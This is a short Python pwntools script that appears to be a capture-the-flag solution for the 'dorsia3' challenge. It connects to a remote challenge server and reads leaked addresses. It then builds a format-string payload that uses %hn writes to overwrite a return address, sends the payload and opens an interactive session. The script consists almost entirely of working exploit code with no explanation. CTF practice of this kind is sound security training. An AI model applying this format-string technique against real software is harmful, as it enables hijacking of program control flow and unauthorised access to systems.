from pwn import  * 

p=remote('dorsia3.wpictf.xyz', 31337)
#p = process("./nanoprint")

refrence_payload = "aAAAA%(addr_lower-5)x$10hn %(addr2_higher-5-addr2_lower)$11hn addr1 addr1+2"
addr1 = int(p.recv(10),16)
ret_addr = addr1 + 97 + 16

addr2_higher = int(p.recv(6),16)
addr2_lower = int(p.recv(4),16)
print hex(ret_addr)
print hex(addr2_higher)
print hex(addr2_lower)
raw_input()
payload = "aAAAAAA"
payload += "%"+str(addr2_lower-7)+"x%15$hn"
payload += "%"+str(addr2_higher - addr2_lower)+"x%16$hn"
payload += p32(ret_addr)
payload += p32(ret_addr+2)

p.send(payload)
p.interactive()


#print "addresses: "+hex(addr1),addr2_higher,addr2_lower

# a AAAA AA%A AAAA x%11 $hn% AAAA Ax%1 1$hn BBBB CCCC